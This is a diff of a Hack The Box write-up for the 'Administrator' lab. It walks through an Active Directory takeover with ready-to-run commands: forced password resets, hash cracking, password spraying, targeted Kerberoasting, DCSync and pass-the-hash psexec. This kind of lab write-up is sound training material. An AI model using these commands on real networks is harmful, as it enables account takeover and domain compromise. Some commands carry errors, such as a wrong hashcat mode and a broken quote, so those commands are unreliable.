@@ -54,6 +54,7 @@ Before we start with a full scan, we want to add the IP address with the box nam
 We can open /etc/hosts with a text editor of our choice and add `<ip> dc01.administrator.htb administrator.htb`. My choice for text editors is sublime.
 
 ```bash
+
 subl /etc/hosts
 ```
 
@@ -72,6 +73,7 @@ We are now initiating a full TCP port scan using aggressive timing to identify o
 ---
 
 ```bash
+
 nmap -sCV -p- <ip or box name> --min-rate=1000 --min-parallelism=1000 -v
 ```
 
@@ -138,6 +140,7 @@ We were given the credentials of Olivia:ichliebedich, and I wanted to do my due 
 I looked into ftp and saw that Olivia cannot log in.
 
 ```bash
+
 ftp <ip>
 # connect with Olivia
 # then enter password: ichliebedich
@@ -150,6 +153,7 @@ Next, I tried smb with the credentials that we were given from the very beginnin
 **Note:** I am using netexec on this box, but I also tend to use smbclient or smbmap to double-check my work. For the sake of this box, I am sticking to netexec.  
 
 ```bash
+
 nxc smb administrator.htb -u olivia -p ichliebedich --shares
 ```
 
@@ -158,6 +162,7 @@ nxc smb administrator.htb -u olivia -p ichliebedich --shares
 We can see that we have read permissions to SYSVOL, NETLOGON, and IPC$, which are typical of what we would see on an SMB share, but there are no other shares that we could use as an easy win.  
 
 ---
+
 ## BloodHound and The BloodyAD Incoming!
 
 So far, we haven't found any information to move forward, but that's okay because we do have credentials that can be used to enumerate internally.  
@@ -167,6 +172,7 @@ This is where BloodHound comes into play!
 Bloodhound-python is a Python-based ingestor that we can use to enumerate the Domain Controller internally and export the data to BloodHound.  
 
 ```bash
+
 bloodhound-python -ns 10.129.129.13 -d administrator.htb -u olivia -p ichliebedich -c all --zip
 ```
 
@@ -201,6 +207,7 @@ I am going to take another route and use `bloodyAD` to have a variation of tools
 In order for us to change Michael's password we can run:
 
 ```bash
+
 bloodyAD -u olivia -p ichliebedich -d administrator.htb --dc-ip 10.129.129.13  set password 'michael' 'Password123!'
 ```
 
@@ -228,6 +235,7 @@ Now, if we click on Ben's name, we can see that in `member of`, he is listed as 
 Knowing that we are going to use Benjamin's new credentials and then log in to the ftp server.
 
 ```bash
+
 bloodyAD -u michael -p 'Password123! -d administrator.htb --dc-ip 10.129.129.13  set password 'benjamin' 'Password123!'
 ```
 
@@ -242,6 +250,7 @@ Used the same command as previously, since it was a pretty efficient way of gett
 Now that we have reset Benjamin's account with the password `Password123!`, we are going to log in to the FTP server.
 
 ```bash
+
 ftp 10.129.129.13
 ```
 
@@ -252,6 +261,7 @@ When typing `ls`, we see that there is a backup.psafe3 file.
 To transfer this file correctly, we will type `bin` to change to binary mode and then `mget Backup.psafe3`.  
 
 ```bash
+
 ls
 bin
 mget Backup.psafe3
@@ -266,6 +276,7 @@ mget Backup.psafe3
 Googling for `psafe3`, we find out that we need Password Safe installed in order to open the file. According to the GitHub page's Linux README.md file, we can install through apt.
 
 ```bash
+
 sudo apt install passwordsafe
 ```
 [Password safe Github](https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true)
@@ -273,6 +284,7 @@ sudo apt install passwordsafe
 When we open Password Safe, we are prompted to connect to the database and enter a master password. We don't have the master password as of yet, but we can use hashcat to crack the `Backup.psafe3` file.
 
 ```bash
+
 hashcat -m 5200 Backup.psafe3 /opt/seclists/Passwords/Leaked-Database/rockyou.txt -o backup.pass
 ```
 
@@ -301,6 +313,7 @@ For sanity's sake, I double-checked Bloodhound and found that every user on the 
 Now that we have our list, we will run NetExec and spray credentials to see who can log in with WinRM, since port 5985 is open.
 
 ```bash
+
 netexec winrm administrator.htb -u user.txt -p pass.txt --continue-on-success | grep '[+]'
 ```
 I use `grep '[+]'` so that I don't have to see all the failed login attempts with netexec.  
@@ -336,12 +349,14 @@ Hacking articles also stated the same information.
 Before we proceed, if we do not update our clocks to match those of the Domain Controller, we will encounter a clock skew error.
 
 ```bash
+
 sudo ntpdate administrator.htb
 ```
 
 We should now be able to run the following command.
 
 ```bash
+
 python3 targetedKerberoast.py --dc-ip 10.129.129.13 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 ```
 ![](/assets/images/htb/administrator/23ethancrack.png)
@@ -349,6 +364,7 @@ python3 targetedKerberoast.py --dc-ip 10.129.129.13 -d administrator.htb -u emil
 Let's place the hash into its own file and use hashcat to crack it!
 
 ```bash
+
 hashcat -m 5200 ethan.hash /opt/seclists/Passwords/Leaked-Databases/rockyou.txt -o ethan.pass
 ```
 
@@ -361,6 +377,7 @@ Back to Bloodhound, we can see that Ethan has `GetChangesAll` (DCSYNC) abilities
 The easiest way of achieving this, as shown on BloodHound, is to use `impacket-secretsdump`
 
 ```bash
+
 impacket-secretsdump administrator.htb/ethan:'limpbizkit'@administrator.htb
 ```
 We now have the NTLM hash of the administrator. 
@@ -370,12 +387,14 @@ We now have the NTLM hash of the administrator.
 Finally, take the back half of the hash and we will run `impacket-psexec`
 
 ```bash
+
 impacket-psexec administrator@administrator.htb -hashes :PLACE HASH HERE
 ```
 
 ![](/assets/images/htb/administrator/26psexec.png)
 
 ---
+
 ## Post-Exploitation and Flag
 
 Now that we have administrator access, we can access the administrator's desktop and retrieve our root.txt flag.
